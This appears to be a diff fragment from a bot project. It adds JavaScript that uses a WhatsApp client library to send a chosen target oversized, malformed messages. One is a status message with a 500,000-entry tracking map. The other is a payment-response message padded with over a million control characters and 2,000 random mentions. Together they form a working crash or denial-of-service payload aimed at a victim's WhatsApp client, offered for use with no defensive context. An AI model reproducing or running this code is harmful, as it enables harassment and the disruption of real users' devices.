+        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
+        mimetype: "image/jpeg",
+        caption: " X ",
+        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
+        fileLength: "19769",
+        height: 354,
+        width: 783,
+        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
+        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
+        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
+        mediaKeyTimestamp: "1743225419",
+        jpegThumbnail: null,
+        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
+        scanLengths: [24378, 17332],
+        contextInfo: {
+          urlTrackingMap: {
+            urlTrackingMapElements: Array.from(
+              { length: 500000 },
+              () => ({ "\0": "\0" })
+            )
+          },
+          remoteJid: "status@broadcast",
+          groupMentions: [],
+          entryPointConversionSource: "booking_status"
+        }
+      }
+    };
+    
+    const msg = generateWAMessageFromContent(target, message, {});
+    await sock.relayMessage("status@broadcast", msg.message, {
+      messageId: msg.key.id,
+      statusJidList: [target],
+      additionalNodes: [{
+        tag: "meta",
+        attrs: {},
+        content: [{
+          tag: "mentioned_users",
+          attrs: {},
+          content: [{
+            tag: "to",
+            attrs: { jid: target },
+            content: undefined
+          }]
+        }]
+      }]
+    });
+    await new Promise((r) => setTimeout(r, 2000));
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: " X ",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "payment_method",
+              paramsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(1045000)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
+              version: 3
+            },
+            mentionedJid: [
+              "13135550002@s.whatsapp.net",
+              ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
+            ]
+          }
+        }
+      }
+    }, { participant: { jid: target } });
+    await new Promise((r) => setTimeout(r, 1000));
+  }
+}
+
+bot.launch()
